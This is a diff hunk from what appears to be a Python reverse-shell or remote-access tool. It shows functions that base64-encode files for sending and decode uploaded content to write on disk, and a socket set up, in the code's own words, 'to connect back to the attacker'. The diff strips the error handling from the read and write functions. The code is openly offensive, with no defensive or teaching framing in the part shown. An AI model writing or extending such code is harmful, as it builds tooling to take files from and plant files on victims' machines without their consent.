@@ -26,25 +26,13 @@ def recieve_json(sock):
             continue
 
 def read_file(path):
-    try:
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read()).decode()
-    except FileNotFoundError:
-        return f"[-] File not found: {path}"
-    except PermissionError:
-        return f"[-] Permission denied: {path}"
-    except Exception as e:
-        return f"[-] Error reading file {path}: {str(e)}"
+    with open(path, "rb") as file:
+        return base64.b64encode(file.read()).decode()
 
 def write_file(path, content):
-    try:
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
-            return "[+] Upload successful [+]"
-    except PermissionError:
-        return f"[-] Permission denied: {path}"
-    except Exception as e:
-        return f"[-] Error writing file {path}: {str(e)}"
+    with open(path, "wb") as file:
+        file.write(base64.b64decode(content))
+        return "[+] Upload successful [+]"
 
 # Create a socket object to connect back to the attacker
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
